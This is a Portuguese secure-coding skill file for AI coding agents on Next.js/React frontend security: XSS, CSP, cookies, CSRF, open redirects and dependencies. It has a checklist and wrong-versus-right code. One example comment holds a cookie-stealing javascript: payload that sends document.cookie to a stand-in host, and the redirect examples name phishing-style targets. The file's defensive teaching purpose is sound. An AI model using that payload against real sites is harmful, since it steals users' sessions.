---
name: frontend-seguranca
description: "Segurança no navegador e na camada Next.js que serve a UI: XSS (dangerouslySetInnerHTML, href javascript:), CSP com nonce, headers (HSTS, nosniff, frame-ancestors e afins), segredos e variáveis NEXT_PUBLIC_, cookies de sessão vs token em localStorage, CSRF em Server Actions e rotas, open redirect, postMessage, scripts de terceiros com SRI, source maps, dados sensíveis em URL/console/storage e dependências npm. Use quando o diff renderizar HTML/Markdown do usuário, mexer em login no cliente, middleware, next.config, headers, redirects, iframes, env vars ou pacotes. Não use para autorização, injeção e rate limit na API (use backend-seguranca) nem para pentest (use auditoria-seguranca-pentest)."
---

# Front-end: segurança

Regras para que o código que roda no navegador, e a camada Next.js que o entrega, não abra brecha para XSS, roubo de sessão, CSRF, vazamento de segredo ou redirecionamento malicioso.
O `implementer` e o `fixer` usam as regras ao construir; o `security-reviewer` usa o checklist para gerar findings com severidade.
Exemplos em Next.js (App Router) + React. Em outro stack, aplique o equivalente (Helmet no Express, CSP no proxy reverso etc.).

Princípio central: o navegador é território do usuário. Tudo que chega ao cliente pode ser lido e alterado. Autorização no front é só UX; a proteção real está no servidor (ver `backend-seguranca`).

## Regras inegociáveis

1. **Nunca renderize HTML não confiável sem sanitizar.** `dangerouslySetInnerHTML`, `innerHTML` e Markdown com HTML sem DOMPurify permitem XSS e roubo de sessão.
2. **URLs vindas de dados passam por allowlist de protocolo (`http:`, `https:`, `mailto:`, `tel:`).** `href="javascript:..."` executa código ao clicar.
3. **Segredo nunca vai para o cliente.** Tudo com prefixo `NEXT_PUBLIC_` e tudo passado como prop a Client Component é público; chave de API, token de serviço e connection string ficam só no servidor.
4. **Sessão em cookie `HttpOnly`, `Secure`, `SameSite=Lax` (ou `Strict`), não em `localStorage`.** Qualquer XSS lê `localStorage`; cookie HttpOnly não.
5. **Mutações protegidas contra CSRF.** Cookie SameSite + verificação de `Origin`/`Host` (Server Actions fazem isso; Route Handlers e Express precisam fazer) + token quando houver GET com efeito colateral ou SameSite=None.
6. **Redirect para destino vindo do usuário só com allowlist.** `?next=https://phishing.com` após login é open redirect.
7. **CSP ativa, sem `unsafe-eval` e sem `unsafe-inline` em `script-src`; `frame-ancestors` definido.** CSP limita o estrago de um XSS e bloqueia clickjacking.
8. **Headers de segurança em todas as respostas: HSTS, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`.** Sem eles o navegador fica em modo permissivo.
9. **`postMessage` recebido valida `event.origin` exato; enviado usa `targetOrigin` explícito, nunca `'*'` com dado sensível.** Qualquer janela pode mandar mensagem.
10. **Dado sensível fora de URL, console, `localStorage` e analytics.** Query string vai para logs, histórico e `Referer`; console e storage ficam acessíveis a extensões e XSS.
11. **Script de terceiro é código com acesso total à página.** Mínimo necessário, fonte confiável, SRI quando a URL é fixa, CSP restringindo origens.
12. **Source maps de produção não são públicos.** Envie ao Sentry e não publique `.map` no CDN.
13. **Dependência nova é auditada.** Nome conferido (typosquatting), mantida, sem vulnerabilidade alta no `npm audit`, lockfile commitado.

## Como construir

### XSS
- React escapa texto em `{valor}` por padrão. O risco está em `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, `eval`, `new Function`, `setTimeout(string)`, `href`/`src` dinâmicos e bibliotecas que aceitam HTML.
- Conteúdo rico do usuário (descrição de produto, observação): sanitize com DOMPurify (`isomorphic-dompurify` no servidor) com allowlist de tags; prefira Markdown renderizado sem HTML bruto (`react-markdown` sem `rehype-raw`).
- URLs dinâmicas: parse com `new URL()` e confira `protocol`. Links externos com `rel="noopener noreferrer"`.
- JSON embutido em `<script>` (ex.: JSON-LD): serialize escapando `<` para `\u003c`.
- Nunca construa seletor, regex ou HTML concatenando entrada do usuário.

### CSP e headers
- CSP com nonce por request gerado no middleware (`proxy.ts` no Next.js 16+) e `'strict-dynamic'`; o Next.js aplica o nonce aos próprios scripts quando o header é repassado. Nonce exige renderização dinâmica.
- Alternativa sem nonce (sites estáticos): CSP com hashes ou `script-src 'self'` sem inline.
- Comece em `Content-Security-Policy-Report-Only` com `report-to`, corrija violações, depois aplique.
- Headers estáticos em `next.config` (`async headers()`) ou no proxy/CDN. Em Express, `helmet()`.
- `poweredByHeader: false` no `next.config`.
- Detalhes e exemplo completo em [references/xss-csp-headers.md](references/xss-csp-headers.md).

### Sessão, tokens e CSRF
- Login gera cookie de sessão `HttpOnly; Secure; SameSite=Lax; Path=/` com expiração; o JS do cliente não toca no token.
- Se a API exige Bearer (app mobile, integração), o front web usa BFF: o servidor Next.js guarda o token e chama a API.
- Access token curto + refresh em cookie HttpOnly restrito ao path de refresh, com rotação (detalhes de emissão em `backend-seguranca`).
- Logout limpa cookie no servidor, invalida a sessão, limpa cache do TanStack Query e dados locais do tenant.
- Server Actions: o Next.js compara `Origin` com `Host`; atrás de proxy com host diferente, configure `experimental.serverActions.allowedOrigins` em vez de desligar a checagem.
- Route Handlers e Express com cookie de sessão: verifique `Origin` (ou `Sec-Fetch-Site`) em métodos que mudam estado; GET nunca muda estado.
- Detalhes em [references/sessao-csrf-redirects.md](references/sessao-csrf-redirects.md).

### Redirects e navegação
- `?next=`/`returnTo`: aceite só caminho relativo que, resolvido com `new URL(next, base)`, mantenha a mesma origem; rejeite `\` e caracteres de controle. Para destinos externos, allowlist de hosts.
- `window.open` para URL externa com `noopener`.
- iframes de terceiros com `sandbox` mínimo e `allow` explícito.

### Segredos e exposição
- Variáveis validadas com Zod em dois schemas: servidor (privadas) e cliente (`NEXT_PUBLIC_`). O schema do cliente não pode conter nada sensível.
- Módulos que usam segredo começam com `import 'server-only'`.
- Props de Client Components: DTO mínimo. Nunca o objeto do usuário inteiro com `passwordHash`, tokens ou flags internas.
- Mensagens de erro para o usuário sem stack trace, SQL ou caminho de arquivo.
- `console.log` com dados de cliente, CPF, token ou payload de pagamento é removido antes do commit.

### Terceiros e dependências
- Script de terceiro só onde necessário, com `next/script`, origem listada na CSP e, se a URL é versionada e fixa, `integrity` + `crossOrigin="anonymous"`.
- Pixels e analytics não recebem PII (e-mail, CPF, telefone) em parâmetros.
- `npm audit --omit=dev` (ou `pnpm audit`) sem vulnerabilidade alta/crítica em dependência de runtime; lockfile no commit; `npm ci` no CI.
- Antes de adicionar pacote: nome exato, downloads, manutenção recente, repositório público, scripts de `postinstall`. Detalhes em [references/supply-chain-e-terceiros.md](references/supply-chain-e-terceiros.md).

### Outras classes
- Prototype pollution: não faça merge profundo de objeto vindo do usuário em objeto de config; valide com Zod (`.strict()`) antes; bloqueie chaves `__proto__`, `constructor`, `prototype`.
- ReDoS: regex com quantificadores aninhados (`(a+)+`, `(.*)*`) aplicada a entrada do usuário trava a thread; simplifique ou limite o tamanho da entrada antes.
- Upload no cliente: validar tipo/tamanho é UX; exibir arquivo enviado por outro usuário só via URL de storage com `Content-Disposition` adequado (ver `backend-seguranca`).
- Clipboard, geolocalização, câmera: pedir só quando necessário; `Permissions-Policy` desliga o resto.

## Checklist de revisão

| # | Verificação | Severidade padrão |
|---|---|---|
| 1 | `dangerouslySetInnerHTML`/`innerHTML` com conteúdo não confiável sem DOMPurify | urgente |
| 2 | `href`/`src` dinâmico sem validação de protocolo (permite `javascript:`) | urgente |
| 3 | Segredo em variável `NEXT_PUBLIC_`, em código client ou em props/retorno serializado ao cliente | urgente |
| 4 | Objeto com `passwordHash`, token ou dado de outro tenant passado a Client Component | urgente |
| 5 | Token de sessão/JWT gravado em `localStorage`/`sessionStorage` ou legível por JS | urgente |
| 6 | Redirect para `next`/`returnTo`/`url` vindo do usuário sem allowlist (open redirect) | urgente |
| 7 | Route Handler/Express que muda estado com cookie de sessão sem verificação de Origin/token CSRF, ou GET com efeito colateral | urgente |
| 8 | `eval`, `new Function` ou `setTimeout(string)` com dado externo | urgente |
| 9 | Cookie de sessão sem `HttpOnly`, `Secure` ou `SameSite` | alto |
| 10 | CSP ausente, ou com `unsafe-inline`/`unsafe-eval` em `script-src` | alto |
| 11 | `frame-ancestors`/`X-Frame-Options` ausente (clickjacking) | alto |
| 12 | Listener de `message` sem checar `event.origin`, ou `postMessage(dado, '*')` com dado sensível | alto |
| 13 | Dado sensível (CPF, token, e-mail, cartão) em query string, `console.log` ou storage | alto |
| 14 | Dependência de runtime nova com vulnerabilidade alta/crítica, nome suspeito ou sem lockfile atualizado | alto |
| 15 | Source maps de produção publicados (`productionBrowserSourceMaps: true` sem restrição) | alto |
| 16 | `serverActions.allowedOrigins` com coringa amplo ou checagem de origem desativada | alto |
| 17 | Merge profundo de objeto do usuário em config/estado sem validação (prototype pollution) | alto |
| 18 | Logout sem invalidar sessão no servidor ou sem limpar cache/dados locais | medio |
| 19 | Headers HSTS, `nosniff`, `Referrer-Policy` ou `Permissions-Policy` ausentes | medio |
| 20 | Script de terceiro sem `next/script`, fora da CSP, ou URL fixa sem SRI | medio |
| 21 | PII enviada a analytics/pixel | medio |
| 22 | Link externo com `target="_blank"` sem `rel="noopener noreferrer"` | medio |
| 23 | Regex com quantificador aninhado aplicada a entrada sem limite de tamanho (ReDoS) | medio |
| 24 | Mensagem de erro exibindo stack trace, SQL ou detalhe interno | medio |
| 25 | `remotePatterns` de imagens com coringa amplo | medio |
| 26 | Módulo com segredo sem `import 'server-only'` | baixo |
| 27 | Header `X-Powered-By` exposto | baixo |

## Anti-padrões (errado → certo)

### HTML do usuário sem sanitização

```tsx
// errado
<div dangerouslySetInnerHTML={{ __html: produto.descricao }} />

// certo
import DOMPurify from 'isomorphic-dompurify';
const limpo = DOMPurify.sanitize(produto.descricao, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'strong', 'em', 'ul', 'ol', 'li', 'br'],
  ALLOWED_ATTR: [],
});
<div dangerouslySetInnerHTML={{ __html: limpo }} />
```

### Link com protocolo livre

```tsx
// errado: loja.site = "javascript:fetch('https://x.io?c='+document.cookie)"
<a href={loja.site}>Site da loja</a>

// certo
function urlSegura(valor: string): string | undefined {
  try {
    const u = new URL(valor);
    return ['http:', 'https:'].includes(u.protocol) ? u.toString() : undefined;
  } catch {
    return undefined;
  }
}
const href = urlSegura(loja.site);
{href && <a href={href} target="_blank" rel="noopener noreferrer">Site da loja</a>}
```

### Token em localStorage

```ts
// errado
localStorage.setItem('token', data.accessToken);
fetch('/api/vendas', { headers: { Authorization: `Bearer ${localStorage.getItem('token')}` } });

// certo: o servidor grava cookie HttpOnly e o navegador envia sozinho
// app/api/login/route.ts
const res = NextResponse.json({ ok: true });
res.cookies.set('sessao', sessaoId, { httpOnly: true, secure: true, sameSite: 'lax', path: '/', maxAge: 60 * 60 * 8 });
return res;
```

### Open redirect após login

```ts
// errado
redirect(searchParams.next ?? '/');

// certo
function destinoSeguro(next: string | undefined): string {
  // só caminho relativo; barra invertida e caracteres de controle viram "//" em alguns navegadores
  if (!next || !next.startsWith('/') || /[\\\x00-\x1f]/.test(next)) return '/';
  const base = 'https://app.invalid';
  const u = new URL(next, base);
  return u.origin === base ? u.pathname + u.search + u.hash : '/'; // bloqueia "//evil.com"
}
redirect(destinoSeguro(searchParams.next));
```

### postMessage sem origem

```ts
// errado
window.addEventListener('message', (e) => aplicarConfig(e.data));

// certo
const ORIGEM_PERMITIDA = 'https://checkout.parceiro.com.br';
window.addEventListener('message', (e) => {
  if (e.origin !== ORIGEM_PERMITIDA) return;
  const parsed = configSchema.safeParse(e.data);
  if (parsed.success) aplicarConfig(parsed.data);
});
```

## Referências

- [references/xss-csp-headers.md](references/xss-csp-headers.md): leia quando renderizar conteúdo do usuário, configurar CSP com nonce, headers de segurança ou revisar middleware/`next.config`.
- [references/sessao-csrf-redirects.md](references/sessao-csrf-redirects.md): leia quando mexer em login/logout, cookies, tokens, Server Actions, Route Handlers com cookie, redirects ou iframes.
- [references/supply-chain-e-terceiros.md](references/supply-chain-e-terceiros.md): leia quando adicionar dependência, script de terceiro, SDK de analytics/pagamento ou configurar source maps.

Skills vizinhas: `backend-seguranca` (autorização, injeção, rate limit), `auditoria-seguranca-pentest` (testes ofensivos), `devops-observabilidade-lgpd` (Sentry, LGPD), `frontend-engenharia` (estrutura de Server Actions).
